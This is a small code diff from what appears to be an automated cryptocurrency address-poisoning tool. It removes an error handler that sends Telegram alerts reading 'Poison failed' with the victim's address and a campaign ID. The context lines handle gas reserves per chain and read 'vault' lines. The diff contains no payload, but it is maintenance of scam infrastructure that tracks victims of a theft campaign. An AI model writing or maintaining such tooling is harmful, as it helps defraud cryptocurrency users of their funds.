@@ -551,25 +551,6 @@ def get_native_reserve_wei(chain_name):
         price = worst_case_prices.get(chain_name.lower(), 4000)
         return int((GAS_RESERVE_USD / price) * (10 ** 18))
 
-          
-    except Exception as e:
-        err_str = str(e)
-        
-        # Clean up raw RPC dictionary errors
-        if "'message':" in err_str:
-            import re
-            match = re.search(r"'message':\s*'([^']+)'", err_str)
-            if match:
-                err_str = match.group(1)
-                
-        logger.error(f"Error: {err_str}")
-        send_telegram(
-            f"❌ Poison failed\n\n"
-            f"Victim: {victim_address}\n\n"
-            f"⚠️ Error: {err_str}", 
-            campaign_id=campaign_id
-        )
-        return False
 
 def read_vault_lines(file_path):
     lines = []
